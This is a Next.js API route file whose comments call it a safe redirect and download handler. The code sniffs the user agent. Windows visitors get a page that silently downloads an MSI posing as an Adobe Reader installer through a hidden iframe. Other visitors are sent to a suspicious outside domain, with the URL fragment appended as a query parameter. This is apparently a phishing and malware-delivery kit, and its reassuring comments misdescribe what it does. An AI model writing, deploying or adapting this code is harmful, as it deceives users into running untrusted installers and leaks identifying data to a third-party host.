// pages/api/redirect.js
// SAFE, configurable redirect + download handler.
// Replace ADOBE_URL and NON_WINDOWS_TARGET with your OWN safe URLs.

export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const isWindows = /windows/i.test(userAgent);

  // Config — set your own URLs here
  const ADOBE_URL = 'https://your-adobe-landing.example.com';        // where Windows users go after download
  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=';   // where non-Windows users will be redirected
  const MSI_PATH = '/Reader_en_install.msi';                        // must exist in /public

  if (isWindows) {
    // Serve HTML that triggers MSI download and then redirects to ADOBE_URL
    const html = `<!doctype html>
      <html>
        <head><meta charset="utf-8"><title>Preparing download…</title></head>
        <body>
          <p>Your download will start shortly…</p>
          <script>
            try {
              // Trigger download via hidden iframe (file must exist at MSI_PATH)
              const iframe = document.createElement('iframe');
              iframe.style.display = 'none';
              iframe.src = ${JSON.stringify(MSI_PATH)};
              document.body.appendChild(iframe);
            } catch (e) {
              // ignore errors — link fallback below will help
              console.error(e);
            }

            // Redirect after a short delay so download has a chance to start
            setTimeout(function(){
              window.location.href = ${JSON.stringify(ADOBE_URL)};
            }, 3000);
          </script>

          <noscript>
            <p>Please <a href="${MSI_PATH}">click here to download</a>. You will be redirected shortly.</p>
            <meta http-equiv="refresh" content="5;url=${ADOBE_URL}">
          </noscript>
        </body>
      </html>`;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  // Non-Windows: serve HTML that reads the fragment and forwards it to NON_WINDOWS_TARGET
  // We append the fragment value as a query parameter named "smn".
  const html = `<!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Redirecting…</title></head>
      <body>
        <p>Redirecting…</p>
        <script>
          (function(){
            var hash = window.location.hash || '';
            var base = ${JSON.stringify(NON_WINDOWS_TARGET)};
            if (hash && hash.length > 1) {
              // remove leading '#'
              var raw = hash.substring(1);
              // it's safer to decode then re-encode so encoding is consistent
              try { raw = decodeURIComponent(raw); } catch (e) { /* ignore */ }
              var safe = encodeURIComponent(raw);
              // append as query param 'smn' — change param name here if desired
              var sep = base.indexOf('?') === -1 ? '?' : '&';
              var final = base + sep + 'smn=' + safe;
              window.location.replace(final);
            } else {
              // no hash present — just go to base
              window.location.replace(base);
            }
          })();
        </script>

        <noscript>
          <meta http-equiv="refresh" content="0;url=${NON_WINDOWS_TARGET}">
        </noscript>
      </body>
    </html>`;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.status(200).send(html);
}
